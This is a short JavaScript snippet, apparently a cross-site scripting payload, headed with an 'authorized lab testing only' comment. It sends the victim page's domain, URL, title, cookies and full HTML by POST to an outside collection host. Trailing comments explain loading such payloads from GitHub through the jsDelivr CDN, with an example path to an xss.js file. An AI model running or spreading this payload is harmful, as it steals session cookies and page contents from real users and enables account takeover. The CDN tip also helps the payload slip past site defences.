// Example for authorized lab testing only
fetch('https://cb.colax.online/log/jsdelivr.net/', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        domain: document.domain,
        url: document.URL,
        title: document.title,
        cookies: document.cookie,
        // Optional: Capture full page HTML source
        bodyHTML: document.documentElement.outerHTML
    })
});

// https://cdn.jsdelivr.net/ will allow you to proxy any file on github.com
// https://cdn.jsdelivr.net/gh/<username>/<project>/<filename>
// https://cdn.jsdelivr.net/gh/renniepak/xss/xss.js
